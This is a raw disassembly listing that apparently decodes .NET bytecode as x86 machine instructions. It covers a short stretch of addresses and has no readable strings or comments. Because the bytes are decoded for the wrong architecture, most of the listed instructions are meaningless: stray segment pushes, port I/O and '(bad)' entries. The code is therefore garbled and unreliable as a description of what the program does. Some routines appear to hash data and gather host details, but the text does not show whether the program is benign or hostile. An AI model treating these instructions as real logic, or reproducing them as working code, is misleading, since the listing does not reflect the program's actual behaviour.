  40309c:	0a 0c 38             	or     (%eax,%edi,1),%cl
  40309f:	86 00                	xchg   %al,(%eax)
  4030a1:	00 00                	add    %al,(%eax)
  4030a3:	08 6f 83             	or     %ch,-0x7d(%edi)
  4030a6:	00 00                	add    %al,(%eax)
  4030a8:	0a 0d 00 09 72 17    	or     0x17720900,%cl
  4030ae:	04 00                	add    $0x0,%al
  4030b0:	70 6f                	jo     0x403121
  4030b2:	84 00                	test   %al,(%eax)
  4030b4:	00 0a                	add    %cl,(%edx)
  4030b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4030b7:	33 00                	xor    (%eax),%eax
  4030b9:	00 0a                	add    %cl,(%edx)
  4030bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4030bc:	7e 00                	jle    0x4030be
  4030be:	00 0a                	add    %cl,(%edx)
  4030c0:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4030c3:	04 72                	add    $0x72,%al
  4030c5:	31 04 00             	xor    %eax,(%eax,%eax,1)
  4030c8:	70 28                	jo     0x4030f2
  4030ca:	1f                   	pop    %ds
  4030cb:	00 00                	add    %al,(%eax)
  4030cd:	0a 2c 21             	or     (%ecx,%eiz,1),%ch
  4030d0:	09 72 5d             	or     %esi,0x5d(%edx)
  4030d3:	04 00                	add    $0x0,%al
  4030d5:	70 6f                	jo     0x403146
  4030d7:	84 00                	test   %al,(%eax)
  4030d9:	00 0a                	add    %cl,(%edx)
  4030db:	6f                   	outsl  %ds:(%esi),(%dx)
  4030dc:	33 00                	xor    (%eax),%eax
  4030de:	00 0a                	add    %cl,(%edx)
  4030e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e1:	85 00                	test   %eax,(%eax)
  4030e3:	00 0a                	add    %cl,(%edx)
  4030e5:	72 69                	jb     0x403150
  4030e7:	04 00                	add    $0x0,%al
  4030e9:	70 6f                	jo     0x40315a
  4030eb:	7f 00                	jg     0x4030ed
  4030ed:	00 0a                	add    %cl,(%edx)
  4030ef:	2d 2a 11 04 72       	sub    $0x7204112a,%eax
  4030f4:	79 04                	jns    0x4030fa
  4030f6:	00 70 6f             	add    %dh,0x6f(%eax)
  4030f9:	7f 00                	jg     0x4030fb
  4030fb:	00 0a                	add    %cl,(%edx)
  4030fd:	2d 1c 09 72 5d       	sub    $0x5d72091c,%eax
  403102:	04 00                	add    $0x0,%al
  403104:	70 6f                	jo     0x403175
  403106:	84 00                	test   %al,(%eax)
  403108:	00 0a                	add    %cl,(%edx)
  40310a:	6f                   	outsl  %ds:(%esi),(%dx)
  40310b:	33 00                	xor    (%eax),%eax
  40310d:	00 0a                	add    %cl,(%edx)
  40310f:	72 87                	jb     0x403098
  403111:	04 00                	add    $0x0,%al
  403113:	70 28                	jo     0x40313d
  403115:	1f                   	pop    %ds
  403116:	00 00                	add    %al,(%eax)
  403118:	0a 2b                	or     (%ebx),%ch
  40311a:	01 17                	add    %edx,(%edi)
  40311c:	13 05 11 05 2c 06    	adc    0x62c0511,%eax
  403122:	00 17                	add    %dl,(%edi)
  403124:	13 06                	adc    (%esi),%eax
  403126:	de 42 00             	fiadds 0x0(%edx)
  403129:	08 6f 86             	or     %ch,-0x7a(%edi)
  40312c:	00 00                	add    %al,(%eax)
  40312e:	0a 3a                	or     (%edx),%bh
  403130:	6f                   	outsl  %ds:(%esi),(%dx)
  403131:	ff                   	(bad)
  403132:	ff                   	(bad)
  403133:	ff                   	lcall  (bad)
  403134:	de 0b                	fimuls (%ebx)
  403136:	08 2c 07             	or     %ch,(%edi,%eax,1)
  403139:	08 6f 2d             	or     %ch,0x2d(%edi)
  40313c:	00 00                	add    %al,(%eax)
  40313e:	0a 00                	or     (%eax),%al
  403140:	dc 00                	faddl  (%eax)
  403142:	de 0b                	fimuls (%ebx)
  403144:	07                   	pop    %es
  403145:	2c 07                	sub    $0x7,%al
  403147:	07                   	pop    %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40314e:	dc 00                	faddl  (%eax)
  403150:	de 0b                	fimuls (%ebx)
  403152:	06                   	push   %es
  403153:	2c 07                	sub    $0x7,%al
  403155:	06                   	push   %es
  403156:	6f                   	outsl  %ds:(%esi),(%dx)
  403157:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40315c:	dc 00                	faddl  (%eax)
  40315e:	de 05 26 00 00 de    	fiadds 0xde000026
  403164:	00 16                	add    %dl,(%esi)
  403166:	13 06                	adc    (%esi),%eax
  403168:	2b 00                	sub    (%eax),%eax
  40316a:	11 06                	adc    %eax,(%esi)
  40316c:	2a 00                	sub    (%eax),%al
  40316e:	00 00                	add    %al,(%eax)
  403170:	01 34 00             	add    %esi,(%eax,%eax,1)
  403173:	00 02                	add    %al,(%edx)
  403175:	00 1e                	add    %bl,(%esi)
  403177:	00 98 b6 00 0b 00    	add    %bl,0xb00b6(%eax)
  40317d:	00 00                	add    %al,(%eax)
  40317f:	00 02                	add    %al,(%edx)
  403181:	00 15 00 af c4 00    	add    %dl,0xc4af00
  403187:	0b 00                	or     (%eax),%eax
  403189:	00 00                	add    %al,(%eax)
  40318b:	00 02                	add    %al,(%edx)
  40318d:	00 0d 00 c5 d2 00    	add    %cl,0xd2c500
  403193:	0b 00                	or     (%eax),%eax
  403195:	00 00                	add    %al,(%eax)
  403197:	00 00                	add    %al,(%eax)
  403199:	00 01                	add    %al,(%ecx)
  40319b:	00 df                	add    %bl,%bh
  40319d:	e0 00                	loopne 0x40319f
  40319f:	05 0f 00 00 01       	add    $0x100000f,%eax
  4031a4:	1b 30                	sbb    (%eax),%esi
  4031a6:	02 00                	add    (%eax),%al
  4031a8:	22 00                	and    (%eax),%al
  4031aa:	00 00                	add    %al,(%eax)
  4031ac:	0a 00                	or     (%eax),%al
  4031ae:	00 11                	add    %dl,(%ecx)
  4031b0:	00 16                	add    %dl,(%esi)
  4031b2:	0a 00                	or     (%eax),%al
  4031b4:	28 56 00             	sub    %dl,0x0(%esi)
  4031b7:	00 0a                	add    %cl,(%edx)
  4031b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ba:	87 00                	xchg   %eax,(%eax)
  4031bc:	00 0a                	add    %cl,(%edx)
  4031be:	12 00                	adc    (%eax),%al
  4031c0:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4031c3:	00 06                	add    %al,(%esi)
  4031c5:	26 06                	es push %es
  4031c7:	0b de                	or     %esi,%ebx
  4031c9:	06                   	push   %es
  4031ca:	26 00 06             	add    %al,%es:(%esi)
  4031cd:	0b de                	or     %esi,%ebx
  4031cf:	00 07                	add    %al,(%edi)
  4031d1:	2a 00                	sub    (%eax),%al
  4031d3:	00 01                	add    %al,(%ecx)
  4031d5:	10 00                	adc    %al,(%eax)
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	00 03                	add    %al,(%ebx)
  4031db:	00 17                	add    %dl,(%edi)
  4031dd:	1a 00                	sbb    (%eax),%al
  4031df:	06                   	push   %es
  4031e0:	0f 00 00             	sldt   (%eax)
  4031e3:	01 1b                	add    %ebx,(%ebx)
  4031e5:	30 02                	xor    %al,(%edx)
  4031e7:	00 2b                	add    %ch,(%ebx)
  4031e9:	00 00                	add    %al,(%eax)
  4031eb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4031ee:	00 11                	add    %dl,(%ecx)
  4031f0:	00 00                	add    %al,(%eax)
  4031f2:	72 9d                	jb     0x403191
  4031f4:	04 00                	add    $0x0,%al
  4031f6:	70 28                	jo     0x403220
  4031f8:	3b 00                	cmp    (%eax),%eax
  4031fa:	00 06                	add    %al,(%esi)
  4031fc:	0b 12                	or     (%edx),%edx
  4031fe:	01 28                	add    %ebp,(%eax)
  403200:	88 00                	mov    %al,(%eax)
  403202:	00 0a                	add    %cl,(%edx)
  403204:	16                   	push   %ss
  403205:	fe 03                	incb   (%ebx)
  403207:	0a 06                	or     (%esi),%al
  403209:	2c 04                	sub    $0x4,%al
  40320b:	17                   	pop    %ss
  40320c:	0c de                	or     $0xde,%al
  40320e:	0a 16                	or     (%esi),%dl
  403210:	0c de                	or     $0xde,%al
  403212:	06                   	push   %es
  403213:	26 00 16             	add    %dl,%es:(%esi)
  403216:	0c de                	or     $0xde,%al
  403218:	00 08                	add    %cl,(%eax)
  40321a:	2a 00                	sub    (%eax),%al
  40321c:	01 10                	add    %edx,(%eax)
  40321e:	00 00                	add    %al,(%eax)
  403220:	00 00                	add    %al,(%eax)
  403222:	01 00                	add    %eax,(%eax)
  403224:	22 23                	and    (%ebx),%ah
  403226:	00 06                	add    %al,(%esi)
  403228:	0f 00 00             	sldt   (%eax)
  40322b:	01 22                	add    %esp,(%edx)
  40322d:	02 28                	add    (%eax),%ch
  40322f:	14 00                	adc    $0x0,%al
  403231:	00 0a                	add    %cl,(%edx)
  403233:	00 2a                	add    %ch,(%edx)
  403235:	00 00                	add    %al,(%eax)
  403237:	00 1b                	add    %bl,(%ebx)
  403239:	30 04 00             	xor    %al,(%eax,%eax,1)
  40323c:	62 00                	bound  %eax,(%eax)
  40323e:	00 00                	add    %al,(%eax)
  403240:	0d 00 00 11 00       	or     $0x110000,%eax
  403245:	00 1b                	add    %bl,(%ebx)
  403247:	8d 0f                	lea    (%edi),%ecx
  403249:	00 00                	add    %al,(%eax)
  40324b:	01 25 16 28 89 00    	add    %esp,0x892816
  403251:	00 0a                	add    %cl,(%edx)
  403253:	8c 71 00             	mov    %?,0x0(%ecx)
  403256:	00 01                	add    %al,(%ecx)
  403258:	a2 25 17 28 8a       	mov    %al,0x8a281725
  40325d:	00 00                	add    %al,(%eax)
  40325f:	0a a2 25 18 28 8b    	or     -0x74d7e7db(%edx),%ah
  403265:	00 00                	add    %al,(%eax)
  403267:	0a a2 25 19 28 8c    	or     -0x73d7e6db(%edx),%ah
  40326d:	00 00                	add    %al,(%eax)
  40326f:	0a a2 25 1a 28 78    	or     0x78281a25(%edx),%ah
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	79 00                	jns    0x40327b
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	73 7a                	jae    0x4032f9
  40327f:	00 00                	add    %al,(%eax)
  403281:	0a 28                	or     (%eax),%ch
  403283:	7b 00                	jnp    0x403285
  403285:	00 0a                	add    %cl,(%edx)
  403287:	8c 5f 00             	mov    %ds,0x0(%edi)
  40328a:	00 01                	add    %al,(%ecx)
  40328c:	a2 28 8d 00 00       	mov    %al,0x8d28
  403291:	0a 28                	or     (%eax),%ch
  403293:	2f                   	das
  403294:	00 00                	add    %al,(%eax)
  403296:	06                   	push   %es
  403297:	0a de                	or     %dh,%bl
  403299:	0a 26                	or     (%esi),%ah
  40329b:	00 72 b5             	add    %dh,-0x4b(%edx)
  40329e:	04 00                	add    $0x0,%al
  4032a0:	70 0a                	jo     0x4032ac
  4032a2:	de 00                	fiadds (%eax)
  4032a4:	06                   	push   %es
  4032a5:	2a 00                	sub    (%eax),%al
  4032a7:	00 01                	add    %al,(%ecx)
  4032a9:	10 00                	adc    %al,(%eax)
  4032ab:	00 00                	add    %al,(%eax)
  4032ad:	00 01                	add    %al,(%ecx)
  4032af:	00 55 56             	add    %dl,0x56(%ebp)
  4032b2:	00 0a                	add    %cl,(%edx)
  4032b4:	0f 00 00             	sldt   (%eax)
  4032b7:	01 13                	add    %edx,(%ebx)
  4032b9:	30 03                	xor    %al,(%ebx)
  4032bb:	00 69 00             	add    %ch,0x0(%ecx)
  4032be:	00 00                	add    %al,(%eax)
  4032c0:	0e                   	push   %cs
  4032c1:	00 00                	add    %al,(%eax)
  4032c3:	11 00                	adc    %eax,(%eax)
  4032c5:	73 8e                	jae    0x403255
  4032c7:	00 00                	add    %al,(%eax)
  4032c9:	0a 0a                	or     (%edx),%cl
  4032cb:	28 8f 00 00 0a 02    	sub    %cl,0x20a0000(%edi)
  4032d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4032d2:	18 00                	sbb    %al,(%eax)
  4032d4:	00 0a                	add    %cl,(%edx)
  4032d6:	0b 06                	or     (%esi),%eax
  4032d8:	07                   	pop    %es
  4032d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4032da:	90                   	nop
  4032db:	00 00                	add    %al,(%eax)
  4032dd:	0a 0b                	or     (%ebx),%cl
  4032df:	73 91                	jae    0x403272
  4032e1:	00 00                	add    %al,(%eax)
  4032e3:	0a 0c 00             	or     (%eax,%eax,1),%cl
  4032e6:	07                   	pop    %es
  4032e7:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  4032ec:	1f                   	pop    %ds
  4032ed:	09 11                	or     %edx,(%ecx)
  4032ef:	04 91                	add    $0x91,%al
  4032f1:	13 05 08 12 05 72    	adc    0x72051208,%eax
  4032f7:	c7 04 00 70 28 92 00 	movl   $0x922870,(%eax,%eax,1)
  4032fe:	00 0a                	add    %cl,(%edx)
  403300:	6f                   	outsl  %ds:(%esi),(%dx)
  403301:	93                   	xchg   %eax,%ebx
  403302:	00 00                	add    %al,(%eax)
  403304:	0a 26                	or     (%esi),%ah
  403306:	11 04 17             	adc    %eax,(%edi,%edx,1)
  403309:	58                   	pop    %eax
  40330a:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40330d:	04 09                	add    $0x9,%al
  40330f:	8e 69 32             	mov    0x32(%ecx),%gs
  403312:	da 08                	fimull (%eax)
  403314:	6f                   	outsl  %ds:(%esi),(%dx)
  403315:	33 00                	xor    (%eax),%eax
  403317:	00 0a                	add    %cl,(%edx)
  403319:	16                   	push   %ss
  40331a:	1f                   	pop    %ds
  40331b:	14 6f                	adc    $0x6f,%al
  40331d:	94                   	xchg   %eax,%esp
  40331e:	00 00                	add    %al,(%eax)
  403320:	0a 6f 95             	or     -0x6b(%edi),%ch
  403323:	00 00                	add    %al,(%eax)
  403325:	0a 13                	or     (%ebx),%dl
  403327:	06                   	push   %es
  403328:	2b 00                	sub    (%eax),%eax
  40332a:	11 06                	adc    %eax,(%esi)
  40332c:	2a 00                	sub    (%eax),%al
  40332e:	00 00                	add    %al,(%eax)
  403330:	13 30                	adc    (%eax),%esi
  403332:	06                   	push   %es
  403333:	00 c4                	add    %al,%ah
  403335:	01 00                	add    %eax,(%eax)
  403337:	00 0f                	add    %cl,(%edi)
  403339:	00 00                	add    %al,(%eax)
  40333b:	11 00                	adc    %eax,(%eax)
  40333d:	73 4d                	jae    0x40338c
  40333f:	00 00                	add    %al,(%eax)
  403341:	0a 0a                	or     (%edx),%cl
  403343:	06                   	push   %es
  403344:	72 f1                	jb     0x403337
  403346:	01 00                	add    %eax,(%eax)
  403348:	70 6f                	jo     0x4033b9
  40334a:	4e                   	dec    %esi
  40334b:	00 00                	add    %al,(%eax)
  40334d:	0a 72 cd             	or     -0x33(%edx),%dh
  403350:	04 00                	add    $0x0,%al
  403352:	70 6f                	jo     0x4033c3
  403354:	4f                   	dec    %edi
  403355:	00 00                	add    %al,(%eax)
  403357:	0a 00                	or     (%eax),%al
  403359:	06                   	push   %es
  40335a:	72 e3                	jb     0x40333f
  40335c:	04 00                	add    $0x0,%al
  40335e:	70 6f                	jo     0x4033cf
  403360:	4e                   	dec    %esi
  403361:	00 00                	add    %al,(%eax)
  403363:	0a 7e 10             	or     0x10(%esi),%bh
  403366:	00 00                	add    %al,(%eax)
  403368:	04 6f                	add    $0x6f,%al
  40336a:	4f                   	dec    %edi
  40336b:	00 00                	add    %al,(%eax)
  40336d:	0a 00                	or     (%eax),%al
  40336f:	06                   	push   %es
  403370:	72 ed                	jb     0x40335f
  403372:	04 00                	add    $0x0,%al
  403374:	70 6f                	jo     0x4033e5
  403376:	4e                   	dec    %esi
  403377:	00 00                	add    %al,(%eax)
  403379:	0a 28                	or     (%eax),%ch
  40337b:	8a 00                	mov    (%eax),%al
  40337d:	00 0a                	add    %cl,(%edx)
  40337f:	6f                   	outsl  %ds:(%esi),(%dx)
  403380:	33 00                	xor    (%eax),%eax
  403382:	00 0a                	add    %cl,(%edx)
  403384:	6f                   	outsl  %ds:(%esi),(%dx)
  403385:	4f                   	dec    %edi
  403386:	00 00                	add    %al,(%eax)
  403388:	0a 00                	or     (%eax),%al
  40338a:	06                   	push   %es
  40338b:	72 f7                	jb     0x403384
  40338d:	04 00                	add    $0x0,%al
  40338f:	70 6f                	jo     0x403400
  403391:	4e                   	dec    %esi
  403392:	00 00                	add    %al,(%eax)
  403394:	0a 73 7c             	or     0x7c(%ebx),%dh
  403397:	00 00                	add    %al,(%eax)
  403399:	0a 28                	or     (%eax),%ch
  40339b:	7d 00                	jge    0x40339d
  40339d:	00 0a                	add    %cl,(%edx)
  40339f:	6f                   	outsl  %ds:(%esi),(%dx)
  4033a0:	33 00                	xor    (%eax),%eax
  4033a2:	00 0a                	add    %cl,(%edx)
  4033a4:	72 fd                	jb     0x4033a3
  4033a6:	04 00                	add    $0x0,%al
  4033a8:	70 14                	jo     0x4033be
  4033aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ab:	96                   	xchg   %eax,%esi
  4033ac:	00 00                	add    %al,(%eax)
  4033ae:	0a 72 11             	or     0x11(%edx),%dh
  4033b1:	05 00 70 28 97       	add    $0x97287000,%eax
  4033b6:	00 00                	add    %al,(%eax)
  4033b8:	0a 0b                	or     (%ebx),%cl
  4033ba:	12 01                	adc    (%ecx),%al
  4033bc:	28 98 00 00 0a 72    	sub    %bl,0x720a0000(%eax)
  4033c2:	15 05 00 70 72       	adc    $0x72700005,%eax
  4033c7:	1f                   	pop    %ds
  4033c8:	05 00 70 6f 96       	add    $0x966f7000,%eax
  4033cd:	00 00                	add    %al,(%eax)
  4033cf:	0a 72 2b             	or     0x2b(%edx),%dh
  4033d2:	05 00 70 72 37       	add    $0x37727000,%eax
  4033d7:	05 00 70 6f 96       	add    $0x966f7000,%eax
  4033dc:	00 00                	add    %al,(%eax)
  4033de:	0a 28                	or     (%eax),%ch
  4033e0:	40                   	inc    %eax
  4033e1:	00 00                	add    %al,(%eax)
  4033e3:	0a 6f 4f             	or     0x4f(%edi),%ch
  4033e6:	00 00                	add    %al,(%eax)
  4033e8:	0a 00                	or     (%eax),%al
  4033ea:	06                   	push   %es
  4033eb:	72 43                	jb     0x403430
  4033ed:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  4033f2:	00 00                	add    %al,(%eax)
  4033f4:	0a 28                	or     (%eax),%ch
  4033f6:	99                   	cltd
  4033f7:	00 00                	add    %al,(%eax)
  4033f9:	0a 6f 4f             	or     0x4f(%edi),%ch
  4033fc:	00 00                	add    %al,(%eax)
  4033fe:	0a 00                	or     (%eax),%al
  403400:	06                   	push   %es
  403401:	72 4d                	jb     0x403450
  403403:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  403408:	00 00                	add    %al,(%eax)
  40340a:	0a 7e 03             	or     0x3(%esi),%bh
  40340d:	00 00                	add    %al,(%eax)
  40340f:	04 6f                	add    $0x6f,%al
  403411:	4f                   	dec    %edi
  403412:	00 00                	add    %al,(%eax)
  403414:	0a 00                	or     (%eax),%al
  403416:	06                   	push   %es
  403417:	72 5d                	jb     0x403476
  403419:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  40341e:	00 00                	add    %al,(%eax)
  403420:	0a 28                	or     (%eax),%ch
  403422:	31 00                	xor    %eax,(%eax)
  403424:	00 06                	add    %al,(%esi)
  403426:	0b 12                	or     (%edx),%edx
  403428:	01 28                	add    %ebp,(%eax)
  40342a:	98                   	cwtl
  40342b:	00 00                	add    %al,(%eax)
  40342d:	0a 6f 7e             	or     0x7e(%edi),%ch
  403430:	00 00                	add    %al,(%eax)
  403432:	0a 72 69             	or     0x69(%edx),%dh
  403435:	05 00 70 72 5d       	add    $0x5d727000,%eax
  40343a:	05 00 70 6f 96       	add    $0x966f7000,%eax
  40343f:	00 00                	add    %al,(%eax)
  403441:	0a 72 67             	or     0x67(%edx),%dh
  403444:	00 00                	add    %al,(%eax)
  403446:	70 72                	jo     0x4034ba
  403448:	ed                   	in     (%dx),%eax
  403449:	04 00                	add    $0x0,%al
  40344b:	70 6f                	jo     0x4034bc
  40344d:	96                   	xchg   %eax,%esi
  40344e:	00 00                	add    %al,(%eax)
  403450:	0a 6f 4f             	or     0x4f(%edi),%ch
  403453:	00 00                	add    %al,(%eax)
  403455:	0a 00                	or     (%eax),%al
  403457:	06                   	push   %es
  403458:	72 73                	jb     0x4034cd
  40345a:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  40345f:	00 00                	add    %al,(%eax)
  403461:	0a 28                	or     (%eax),%ch
  403463:	36 00 00             	add    %al,%ss:(%eax)
  403466:	06                   	push   %es
  403467:	6f                   	outsl  %ds:(%esi),(%dx)
  403468:	4f                   	dec    %edi
  403469:	00 00                	add    %al,(%eax)
  40346b:	0a 00                	or     (%eax),%al
  40346d:	06                   	push   %es
  40346e:	72 8b                	jb     0x4033fb
  403470:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  403475:	00 00                	add    %al,(%eax)
  403477:	0a 7e 0e             	or     0xe(%esi),%bh
  40347a:	00 00                	add    %al,(%eax)
  40347c:	04 6f                	add    $0x6f,%al
  40347e:	4f                   	dec    %edi
  40347f:	00 00                	add    %al,(%eax)
  403481:	0a 00                	or     (%eax),%al
  403483:	06                   	push   %es
  403484:	72 9d                	jb     0x403423
  403486:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  40348b:	00 00                	add    %al,(%eax)
  40348d:	0a 28                	or     (%eax),%ch
  40348f:	33 00                	xor    (%eax),%eax
  403491:	00 06                	add    %al,(%esi)
  403493:	6f                   	outsl  %ds:(%esi),(%dx)
  403494:	4f                   	dec    %edi
  403495:	00 00                	add    %al,(%eax)
  403497:	0a 00                	or     (%eax),%al
  403499:	06                   	push   %es
  40349a:	72 b1                	jb     0x40344d
  40349c:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  4034a1:	00 00                	add    %al,(%eax)
  4034a3:	0a 28                	or     (%eax),%ch
  4034a5:	99                   	cltd
  4034a6:	00 00                	add    %al,(%eax)
  4034a8:	0a 73 55             	or     0x55(%ebx),%dh
  4034ab:	00 00                	add    %al,(%eax)
  4034ad:	0a 28                	or     (%eax),%ch
  4034af:	9a 00 00 0a 0c 12 02 	lcall  $0x212,$0xc0a0000
  4034b6:	28 9b 00 00 0a 0c    	sub    %bl,0xc0a0000(%ebx)
  4034bc:	12 02                	adc    (%edx),%al
  4034be:	28 9c 00 00 0a 6f 4f 	sub    %bl,0x4f6f0a00(%eax,%eax,1)
  4034c5:	00 00                	add    %al,(%eax)
  4034c7:	0a 00                	or     (%eax),%al
  4034c9:	06                   	push   %es
  4034ca:	72 c5                	jb     0x403491
  4034cc:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  4034d1:	00 00                	add    %al,(%eax)
  4034d3:	0a 72 5b             	or     0x5b(%edx),%dh
  4034d6:	01 00                	add    %eax,(%eax)
  4034d8:	70 6f                	jo     0x403549
  4034da:	4f                   	dec    %edi
  4034db:	00 00                	add    %al,(%eax)
  4034dd:	0a 00                	or     (%eax),%al
  4034df:	06                   	push   %es
  4034e0:	72 cf                	jb     0x4034b1
  4034e2:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  4034e7:	00 00                	add    %al,(%eax)
  4034e9:	0a 7e 12             	or     0x12(%esi),%bh
  4034ec:	00 00                	add    %al,(%eax)
  4034ee:	04 6f                	add    $0x6f,%al
  4034f0:	4f                   	dec    %edi
  4034f1:	00 00                	add    %al,(%eax)
  4034f3:	0a 00                	or     (%eax),%al
  4034f5:	06                   	push   %es
  4034f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4034f7:	51                   	push   %ecx
  4034f8:	00 00                	add    %al,(%eax)
  4034fa:	0a 0d 2b 00 09 2a    	or     0x2a09002b,%cl
  403500:	13 30                	adc    (%eax),%esi
  403502:	02 00                	add    (%eax),%al
  403504:	1a 00                	sbb    (%eax),%al
  403506:	00 00                	add    %al,(%eax)
  403508:	02 00                	add    (%eax),%al
  40350a:	00 11                	add    %dl,(%ecx)
  40350c:	00 28                	add    %ch,(%eax)
  40350e:	9d                   	popf
  40350f:	00 00                	add    %al,(%eax)
  403511:	0a 73 9e             	or     -0x62(%ebx),%dh
  403514:	00 00                	add    %al,(%eax)
  403516:	0a 20                	or     (%eax),%ah
  403518:	20 02                	and    %al,(%edx)
  40351a:	00 00                	add    %al,(%eax)
  40351c:	6f                   	outsl  %ds:(%esi),(%dx)
  40351d:	9f                   	lahf
  40351e:	00 00                	add    %al,(%eax)
  403520:	0a 0a                	or     (%edx),%cl
  403522:	2b 00                	sub    (%eax),%eax
  403524:	06                   	push   %es
  403525:	2a 00                	sub    (%eax),%al
  403527:	00 1b                	add    %bl,(%ebx)
  403529:	30 02                	xor    %al,(%edx)
  40352b:	00 51 00             	add    %dl,0x0(%ecx)
  40352e:	00 00                	add    %al,(%eax)
  403530:	02 00                	add    (%eax),%al
  403532:	00 11                	add    %dl,(%ecx)
  403534:	00 00                	add    %al,(%eax)
  403536:	7e 0f                	jle    0x403547
  403538:	00 00                	add    %al,(%eax)
  40353a:	04 28                	add    $0x28,%al
  40353c:	13 00                	adc    (%eax),%eax
  40353e:	00 0a                	add    %cl,(%edx)
  403540:	2c 07                	sub    $0x7,%al
  403542:	28 31                	sub    %dh,(%ecx)
  403544:	00 00                	add    %al,(%eax)
  403546:	06                   	push   %es
  403547:	2b 01                	sub    (%ecx),%eax
  403549:	16                   	push   %ss
  40354a:	0a 06                	or     (%esi),%al
  40354c:	2c 06                	sub    $0x6,%al
  40354e:	28 41 00             	sub    %al,0x0(%ecx)
  403551:	00 06                	add    %al,(%esi)
  403553:	00 28                	add    %ch,(%eax)
  403555:	38 00                	cmp    %al,(%eax)
  403557:	00 06                	add    %al,(%esi)
  403559:	00 28                	add    %ch,(%eax)
  40355b:	08 00                	or     %al,(%eax)
  40355d:	00 06                	add    %al,(%esi)
  40355f:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  403564:	06                   	push   %es
  403565:	6f                   	outsl  %ds:(%esi),(%dx)
  403566:	a0 00 00 0a 00       	mov    0xa0000,%al
  40356b:	28 06                	sub    %al,(%esi)
  40356d:	00 00                	add    %al,(%eax)
  40356f:	06                   	push   %es
  403570:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  403575:	06                   	push   %es
  403576:	28 a1 00 00 0a 00    	sub    %ah,0xa0000(%ecx)
  40357c:	00 de                	add    %bl,%dh
  40357e:	05 26 00 00 de       	add    $0xde000026,%eax
  403583:	00 2a                	add    %ch,(%edx)
  403585:	00 00                	add    %al,(%eax)
  403587:	00 01                	add    %al,(%ecx)
  403589:	10 00                	adc    %al,(%eax)
  40358b:	00 00                	add    %al,(%eax)
  40358d:	00 01                	add    %al,(%ecx)
  40358f:	00 4a 4b             	add    %cl,0x4b(%edx)
  403592:	00 05 0f 00 00 01    	add    %al,0x100000f
  403598:	1b 30                	sbb    (%eax),%esi
  40359a:	03 00                	add    (%eax),%eax
  40359c:	b1 00                	mov    $0x0,%cl
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	10 00                	adc    %al,(%eax)
  4035a2:	00 11                	add    %dl,(%ecx)
  4035a4:	00 00                	add    %al,(%eax)
  4035a6:	72 db                	jb     0x403583
  4035a8:	05 00 70 28 8b       	add    $0x8b287000,%eax
  4035ad:	00 00                	add    %al,(%eax)
  4035af:	0a 72 e1             	or     -0x1f(%edx),%dh
  4035b2:	05 00 70 28 40       	add    $0x40287000,%eax
  4035b7:	00 00                	add    %al,(%eax)
  4035b9:	0a 72 0d             	or     0xd(%edx),%dh
  4035bc:	06                   	push   %es
  4035bd:	00 70 73             	add    %dh,0x73(%eax)
  4035c0:	a2 00 00 0a 0a       	mov    %al,0xa0a0000
  4035c5:	00 73 a3             	add    %dh,-0x5d(%ebx)
  4035c8:	00 00                	add    %al,(%eax)
  4035ca:	0a 0b                	or     (%ebx),%cl
  4035cc:	00 06                	add    %al,(%esi)
  4035ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4035cf:	81 00 00 0a 6f 82    	addl   $0x826f0a00,(%eax)
  4035d5:	00 00                	add    %al,(%eax)
  4035d7:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  4035da:	20 08                	and    %cl,(%eax)
  4035dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4035dd:	83 00 00             	addl   $0x0,(%eax)
  4035e0:	0a 0d 00 07 09 72    	or     0x72090700,%cl
  4035e6:	4b                   	dec    %ebx
  4035e7:	06                   	push   %es
  4035e8:	00 70 6f             	add    %dh,0x6f(%eax)
  4035eb:	84 00                	test   %al,(%eax)
  4035ed:	00 0a                	add    %cl,(%edx)
  4035ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f0:	33 00                	xor    (%eax),%eax
  4035f2:	00 0a                	add    %cl,(%edx)
  4035f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4035f6:	00 00                	add    %al,(%eax)
  4035f8:	0a 00                	or     (%eax),%al
  4035fa:	00 08                	add    %cl,(%eax)
  4035fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4035fd:	86 00                	xchg   %al,(%eax)
  4035ff:	00 0a                	add    %cl,(%edx)
  403601:	2d d8 de 0b 08       	sub    $0x80bded8,%eax
  403606:	2c 07                	sub    $0x7,%al
  403608:	08 6f 2d             	or     %ch,0x2d(%edi)
  40360b:	00 00                	add    %al,(%eax)
  40360d:	0a 00                	or     (%eax),%al
  40360f:	dc 07                	faddl  (%edi)
  403611:	6f                   	outsl  %ds:(%esi),(%dx)
  403612:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403613:	00 00                	add    %al,(%eax)
